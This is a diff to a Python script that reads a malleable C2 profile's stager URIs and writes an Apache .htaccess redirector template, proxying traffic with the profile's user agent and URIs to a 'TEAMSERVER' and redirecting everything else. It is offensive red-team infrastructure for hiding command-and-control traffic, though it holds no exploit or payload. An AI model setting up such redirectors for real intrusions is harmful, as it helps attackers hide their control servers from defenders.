@@ -85,7 +85,7 @@ else:
     post_uri_end    = contents.find("\n", post_uri_start)
     post_uri        = contents[post_uri_start:post_uri_end].strip()[1:-2]
 
-# Get HTTP Stater URIs x86
+# Get HTTP Stager URIs x86
 http_stager_start = contents.find(http_stager)
 if contents.find(set_uri_86) == -1:
     stager_uri_86 = ""
@@ -96,7 +96,7 @@ else:
     stager_uri_end    = contents.find("\n", stager_uri_start)
     stager_uri_86     = contents[stager_uri_start:stager_uri_end].strip()[1:-2]
 
-# Get HTTP Stater URIs x64
+# Get HTTP Stager URIs x64
 http_stager_start = contents.find(http_stager)
 if contents.find(set_uri_64) == -1:
     stager_uri_64 = ""
@@ -132,11 +132,11 @@ RewriteEngine On
 ## Scripted Web Delivery 
 ## Uncomment and adjust as needed
 #RewriteCond %{{REQUEST_URI}} ^/css/style1.css?$
-#RewriteCond %{{HTTP_USER_AGENT}} ^$ [P]
+#RewriteCond %{{HTTP_USER_AGENT}} ^$ [P,L]
 
 ## Staging Support
 ## Uncomment and adjust as needed
-#RewriteRule ^.*$ "http://TEAMSERVER%{{REQUEST_URI}}" [P]
+#RewriteRule ^.*$ "http://TEAMSERVER%{{REQUEST_URI}}" [P,L]
 #RewriteCond %{{REQUEST_URI}} ^/..../?$
 #RewriteCond %{{HTTP_USER_AGENT}} "{ua}""
 
@@ -146,16 +146,16 @@ RewriteCond %{{REQUEST_URI}} ^({uris})$
 ## Profile UserAgent
 RewriteCond %{{HTTP_USER_AGENT}} "{ua}"
 
-## Logic: If User-Agent Matches and URI matches, proxy the connection to the Teamserver
-## Consider adding other HTTP checks to fine tune the check.  HTTP Cookie, HTTP Referer, HTTP Query String, etc
+## Logic: If a URI matches AND the User-Agent, proxy the connection to the Teamserver
+## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
 ## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
 
-RewriteRule ^.*$ "{destination}%{{REQUEST_URI}}" [P]
+RewriteRule ^.*$ "{c2server}%{{REQUEST_URI}}" [P,L]
 
 ## (Optional)
 ## Redirect All other traffic here (Optional)
 ## Uncomment and adjust as needed
-#RewriteRule ^.*$ {c2server}/? [L,R=302]
+#RewriteRule ^.*$ {destination}/? [L,R=302]
 
 ## .htaccess END
 ########################################
